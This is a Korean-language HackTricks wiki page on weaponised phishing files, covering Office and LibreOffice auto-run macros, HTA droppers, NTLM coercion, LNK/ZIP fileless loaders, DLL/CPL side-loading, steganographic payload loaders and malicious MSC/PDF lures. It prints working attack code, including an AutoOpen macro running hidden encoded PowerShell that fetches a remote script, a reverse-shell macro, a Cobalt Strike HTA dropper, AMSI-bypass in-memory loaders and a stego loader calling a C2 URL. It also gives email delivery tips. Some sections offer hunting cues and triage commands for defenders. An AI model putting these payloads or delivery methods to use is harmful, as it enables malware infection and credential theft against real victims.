# 피싱 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 검증을 수행합니다. 데이터 검증은 OfficeOpenXML 표준에 따라 데이터 구조를 식별하는 방식으로 수행됩니다. 데이터 구조를 식별하는 과정에서 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일에는 `.docm` 확장자가 사용됩니다. 하지만 파일 확장자를 변경해 파일 이름을 바꾸더라도 매크로 실행 기능은 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일의 확장자를 RTF로 바꾸면 Microsoft Word에서 처리되어 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘은 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령을 사용하면 일부 Office 프로그램에서 실행되는 확장자를 확인할 수 있습니다:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX 파일이 매크로를 포함하는 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하는 경우에도 매크로를 “실행”할 수 있습니다.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - 외부 이미지 로드: 다음으로 이동: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

매크로를 사용해 문서에서 임의의 코드를 실행할 수 있습니다.

#### 자동 로드 함수

이러한 함수가 흔하게 사용될수록 AV가 이를 탐지할 가능성이 높습니다.

- AutoOpen()
- Document_Open()

#### 매크로 코드 예제

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 메타데이터 수동 제거

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하면 문서 검사기가 열립니다. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭합니다.

#### 문서 확장자

완료되면 **파일 형식** 드롭다운을 선택하고 형식을 **`.docx`**에서 Word 97-2003 **`.doc`**로 변경합니다.\
**`.docx`** 파일에는 매크로를 저장할 수 없고, 매크로 사용 **`.docm`** 확장자에는 **낙인**이 **찍혀** 있기 때문입니다(예: 미리 보기 아이콘에 커다란 `!`가 표시되고 일부 웹/이메일 게이트웨이는 해당 파일을 완전히 차단합니다). 따라서 이 **레거시 `.doc` 확장자가 가장 나은 절충안**입니다.

#### 악성 매크로 생성기

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 자동 실행 매크로(Basic)

LibreOffice Writer 문서에는 Basic 매크로를 삽입하고, 매크로를 **문서 열기** 이벤트(Tools → Customize → Events → Open Document → Macro…)에 연결해 파일을 열 때 자동으로 실행되도록 설정할 수 있습니다.<sup>[[1]](#references)</sup> 간단한 reverse shell 매크로는 다음과 같습니다:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

문자열 안의 따옴표가 두 번(`""`) 쓰인 점에 유의하세요. LibreOffice Basic에서는 리터럴 따옴표를 이스케이프할 때 이렇게 사용하므로, `...==""")`로 끝나는 payload는 내부 명령과 Shell 인자의 따옴표가 모두 짝을 이룹니다.

전달 팁:

- `.odt`로 저장하고 매크로를 문서 이벤트에 연결해 문서를 열자마자 실행되도록 하세요.
- `swaks`로 이메일을 보낼 때는 `--attach @resume.odt`를 사용하세요(`@`가 있어야 파일 이름 문자열이 아니라 파일 내용이 첨부 파일로 전송됩니다). 검증 없이 임의의 `RCPT TO` 수신자를 허용하는 SMTP 서버를 악용할 때 특히 중요합니다.

## HTA 파일

HTA는 **HTML과 스크립팅 언어(VBScript, JScript 등)를 결합한** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저 보안 모델의 제약을 받지 않는 "완전히 신뢰된" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행합니다. 이 파일은 일반적으로 **Internet Explorer와 함께 설치**되므로 **`mshta`는 IE에 의존합니다**. 따라서 IE가 제거된 경우 HTA를 실행할 수 없습니다.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## 강제로 NTLM 인증 유도하기

**원격으로** NTLM 인증을 **유도하는** 방법은 여러 가지가 있습니다. 예를 들어, 사용자가 열어 볼 이메일이나 HTML에 **보이지 않는 이미지**를 넣을 수 있습니다(HTTP MitM도 가능할까요?). 또는 피해자에게 **폴더를 여는 것만으로도** **인증이 트리거되는** 파일 **주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어와 그 밖의 방법을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증 정보를 훔치는 데 그치지 않고 **NTLM relay 공격도 수행할 수 있다**는 점을 잊지 마세요.

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK 로더 + ZIP 내장 페이로드 (fileless 체인)

매우 효과적인 캠페인에서는 정상적인 미끼 문서(PDF/DOCX) 두 개와 악성 .lnk가 포함된 ZIP 파일을 전달합니다. 핵심은 실제 PowerShell 로더가 ZIP의 원시 바이트에서 고유한 마커 뒤에 저장되고, .lnk가 해당 로더를 추출해 메모리에서 실행한다는 점입니다.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner가 구현하는 일반적인 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 현재 작업 디렉터리의 상위 폴더 등 일반적인 경로에서 원본 ZIP을 찾습니다.
2) ZIP 바이트를 읽고 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 뒤의 모든 내용이 내장된 PowerShell 페이로드입니다.
3) ZIP을 %ProgramData%에 복사해 그곳에 압축을 풀고, 정상적인 파일처럼 보이도록 미끼 .docx를 엽니다.
4) 현재 프로세스에서 AMSI를 우회합니다: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계를 난독화 해제하고(예: 모든 # 문자를 제거) 메모리에서 실행합니다.

내장된 단계를 추출하고 실행하는 PowerShell 기본 예시:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

메모
- 전달 단계에서는 종종 신뢰할 수 있는 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하며, 페이로드 제공을 조건부로 제한할 수 있습니다(IP/UA에 따라 무해한 ZIP 파일 제공).
- 다음 단계에서는 base64/XOR shellcode를 복호화한 뒤 Reflection.Emit + VirtualAlloc을 통해 실행하여 디스크에 남는 흔적을 최소화하는 경우가 많습니다.

같은 체인에서 사용되는 Persistence
- Microsoft Web Browser 컨트롤의 COM TypeLib hijacking을 통해 IE/Explorer 또는 해당 컨트롤을 포함하는 앱이 페이로드를 자동으로 다시 실행하도록 합니다.<sup>[[2]](#references)[[4]](#references)</sup> 자세한 내용과 바로 사용할 수 있는 명령은 여기에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 뒤에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- ZIP 파일을 찾기 위해 상위 폴더/사용자 폴더를 열거하고 미끼 문서를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI 변조.
- 신뢰할 수 있는 PaaS 도메인에서 호스팅된 링크로 끝나는 장시간 진행되는 업무 스레드.

## LNK 미끼 우선 스테이징 → scheduled-task Persistence → 신뢰된 CPL side-loading

반복적으로 관찰되는 또 다른 패턴은 **문서를 가장하는 `.lnk`**가 무해한 미끼를 즉시 열면서 실제 체인을 백그라운드에서 준비하는 방식입니다.<sup>[[3]](#references)</sup>

관찰된 동작:
1. 바로가기는 **PDF로 위장**하고 `conhost.exe` 또는 유사한 프록시를 사용해 난독화된 PowerShell downloader를 실행합니다.
2. PowerShell은 명백한 토큰을 분할합니다(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`). 따라서 `iwr`, `gci`, `ren`, `cpi` 또는 `schtasks`를 찾는 단순한 탐지는 이 명령을 놓칩니다.
3. Stager는 **먼저 미끼 문서를 다운로드**해 피해자에게 열어 주고, 이후 백그라운드에서 악성 파일을 재구성합니다.
4. 페이로드는 **더미 확장자**로 기록된 후 채움 문자를 제거해 이름이 변경될 수 있어, 명백한 `.exe` / `.cpl` 흔적이 나타나는 시점을 늦춥니다.
5. 사용자 쓰기 가능 경로의 신뢰된 호스트 바이너리를 실행하는 **분 단위 scheduled task**로 Persistence를 설정합니다.

이 패턴에서 얻을 수 있는 최소한의 hunting 단서:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

인식해 둘 만한 staging 레이아웃:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 두 번째 stage가 은밀한 이유

Rapid7 사례 연구에서 예약된 작업은 `C:\Users\Public\`의 **`Fondue.exe`**를 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 같은 위치에 배치되어 **`RunFODW`**를 내보냈기 때문에, 신뢰된 Microsoft 바이너리는 정상적인 시스템 사본 대신 공격자의 CPL을 side-load했습니다.

이 CPL은 다음을 수행했습니다.
- `C:\Windows\Tasks\editor.dat`에서 **AES-256-CBC** blob을 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 복호화
- 실행 가능한 메모리를 할당하고 복호화된 shellcode를 복사
- **`EnumUILanguagesW`**의 콜백으로 shellcode 포인터를 전달해 간접 실행

마지막 단계는 별도로 hunting할 가치가 있습니다. 악성코드는 `((void(*)())buf)()`처럼 직접 점프하는 대신, **콜백을 받는 정식 WinAPI**를 악용해 실행을 넘기는 경우가 많습니다.

이 캠페인에서 복호화된 payload는 **Donut** shellcode였습니다. 이 shellcode는 최종 PE를 메모리에서 완전히 매핑한 뒤, 실행을 넘기기 전에 현재 프로세스의 **AMSI/WLDP/ETW**를 패치했습니다. side-loading 및 메모리 상주 post-processing에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실전 hunting pivot:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 실행한 뒤 눈에 보이는 미끼 문서를 표시함.
- **`C:\Users\Public\`**로 짧은 시간 동안 다운로드한 뒤, 의미 없는 확장자를 가진 파일의 이름을 즉시 변경함.
- `GoogleErrorReport`처럼 무해해 보이는 이름의 예약된 작업이 **사용자가 쓸 수 있는 디렉터리**에서 실행됨.
- 신뢰된 바이너리가 같은 비시스템 디렉터리의 **`.cpl` / `.dll`** 파일을 로드함.
- **`C:\Windows\Tasks\`**에 Base64 텍스트 blob을 쓴 뒤 side-load된 모듈이 이를 읽음.

## 이미지의 스테가노그래피 구분자로 감싼 payload (PowerShell stager)

최근 loader 체인은 난독화된 JavaScript/VBS를 전달합니다. 이 스크립트는 Base64 PowerShell stager를 디코딩하고 실행합니다. 해당 stager는 Base64로 인코딩된 .NET DLL을 일반 텍스트로 숨긴 이미지(흔히 GIF)를 다운로드합니다. DLL 텍스트는 고유한 시작/종료 마커 사이에 들어 있습니다. 스크립트는 이러한 구분자를 검색하고(실제 공격에서 확인된 예: «<<sudo_png>> … <<sudo_odt>>>»), 그 사이의 텍스트를 추출해 Base64 디코딩으로 바이트를 얻습니다. 그런 다음 어셈블리를 메모리에 로드하고, C2 URL을 전달해 알려진 진입 메서드를 호출합니다.<sup>[[5]](#references)</sup>

작업 흐름
- Stage 1: 아카이브된 JS/VBS dropper → 내장된 Base64 디코딩 → `-nop -w hidden -ep bypass` 옵션으로 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, 마커로 구분된 Base64 추출, .NET DLL을 메모리에 로드하고 C2 URL과 옵션을 전달해 메서드 호출(예: VAI).
- Stage 3: Loader가 최종 payload를 가져와 보통 프로세스 hollowing을 통해 신뢰된 바이너리(흔히 MSBuild.exe)에 주입합니다.<sup>[[7]](#references)[[8]](#references)</sup> 프로세스 hollowing 및 신뢰된 유틸리티를 통한 proxy execution에 대한 자세한 내용은 다음을 참조하세요.

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

이미지에서 DLL을 추출하고 .NET 메서드를 메모리에서 호출하는 PowerShell 예시:

<details>
<summary>PowerShell 스테고 payload 추출기 및 loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

참고
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다.<sup>[[6]](#references)</sup> 마커는 캠페인마다 다릅니다.
- AMSI/ETW bypass 및 문자열 deobfuscation은 assembly를 로드하기 전에 흔히 적용됩니다.
- 헌팅: 다운로드한 이미지에서 알려진 구분자를 검색하고, 이미지에 접근한 직후 Base64 blob을 decode하는 PowerShell을 식별합니다.

stego 도구 및 carving 기법도 참조하세요:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 관찰되는 초기 stage는 archive 안에 전달되는 작고 난독화가 심한 `.js` 또는 `.vbs` 파일입니다. 이 파일의 유일한 목적은 내장된 Base64 문자열을 decode하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행해 HTTPS를 통해 다음 stage를 부트스트랩하는 것입니다.<sup>[[5]](#references)</sup>

기본 로직 (개요):
- 자체 파일 내용 읽기
- 쓰레기 문자열 사이에 있는 Base64 blob 찾기
- ASCII PowerShell로 decode
- `wscript.exe`/`cscript.exe`를 호출해 `powershell.exe` 실행

헌팅 단서
- 명령줄에 `-enc`/`FromBase64String`이 포함된 `powershell.exe`를 실행하는 archive 내 JS/VBS 첨부 파일.
- 사용자 임시 경로에서 `powershell.exe -nop -w hidden`을 실행하는 `wscript.exe`.

## 실행 컨테이너로 사용되는 MSC 문서 (GrimResource)

Microsoft Management Console 파일 (`.msc`)은 일반적으로 `mmc.exe`로 여는 XML 콘솔 정의 파일입니다. **GrimResource**는 오래된 XSS primitive가 포함된 `apds.dll` resource를 가리키는 `StringTable` 참조를 악용합니다. 따라서 사용자가 조작된 콘솔을 열면 JavaScript가 `mmc.exe` 내부에서 실행됩니다. 관찰된 샘플은 `transformNode` 기반 난독화와 **DotNetToJScript**를 결합해 일반적인 Office-macro 경로를 거치지 않고 .NET payload를 인스턴스화했습니다.<sup>[[9]](#references)</sup>

정적 triage에서는 신뢰할 수 없는 MSC를 텍스트로 취급하고 **더블클릭하지 마세요**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

고신뢰도 runtime pivot은 `mmc.exe`가 CLR 또는 script 구성 요소를 로드하거나, 네트워크 연결을 생성하거나, `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` 또는 예상치 못한 실행 파일을 생성하는 경우입니다. 이 형식은 정상적으로 사용되므로, 모든 MSC를 차단하기보다 **출처 + 의심스러운 XML/script 콘텐츠 + `mmc.exe` 동작**을 연관 지어 탐지해야 합니다.<sup>[[9]](#references)</sup>

## PDF/QR 리디렉터와 payload 게이팅

PDF는 악용되지 않아도 유용하게 쓰일 수 있습니다. 최근 캠페인은 무해해 보이는 문서에 **QR 코드 또는 일반 링크**를 넣어 브라우저 세션을 메일 보안 통제에서 벗어나게 하고, 수신자 주소에 맞춰 목적지를 개인화합니다. Microsoft는 2025년에 QR URL이 수신자마다 고유하며 RaccoonO365 자격 증명 탈취 인프라로 연결되는 PDF 사례를 문서화했습니다. 이와 병행된 공격 체인에서는 IP/환경 게이팅을 사용해 선별된 방문자에게는 JavaScript/MSI 경로를 반환하고, 스캐너나 허용되지 않은 클라이언트에는 무해한 PDF를 반환했습니다.<sup>[[10]](#references)</sup>

PDF 동작과 렌더링된 QR 코드 모두를 분석 단계에서 확인하세요. QR 코드는 추출 가능한 이미지로 저장되는 대신 벡터로 그려질 수 있으므로, 포함된 이미지를 추출하는 것과 함께 모든 페이지를 래스터화하세요:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

격리된 분석 시스템에서 인증하지 않은 상태로 디코딩된 목적지와 redirect를 확인하세요. 유용한 탐색 특징으로는 메일 본문이 거의 비어 있고 QR 코드만 포함된 PDF, query parameter에 삽입된 수신자 이메일, 평판이 좋은 호스팅 서비스를 여러 차례 거치는 redirect, IP, 지리적 위치, 쿠키, referrer 또는 user agent에 따라 다르게 반환되는 콘텐츠가 있습니다. 제어된 프로필을 사용해 요청을 비교하세요. 단일 sandbox fetch에서는 미끼만 전달될 수 있습니다.<sup>[[10]](#references)</sup>

## NTLM hash를 탈취하기 위한 Windows 파일

**NTLM creds를 탈취할 수 있는 위치** 페이지를 확인하세요:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine 캠페인: 미국 기업을 표적으로 한 정교한 phishing 공격](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 중국 테마 loader chain을 통해 추적한 Dropping Elephant의 tradecraft](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 새로운 COM persistence 기법 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader가 다양한 infostealer를 전달](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – 신뢰할 수 있는 개발자 유틸리티를 이용한 proxy execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 초기 접근 및 evasion을 위한 Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 위협 행위자들이 세금 신고 시즌을 이용해 세금 관련 phishing 캠페인을 전개](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
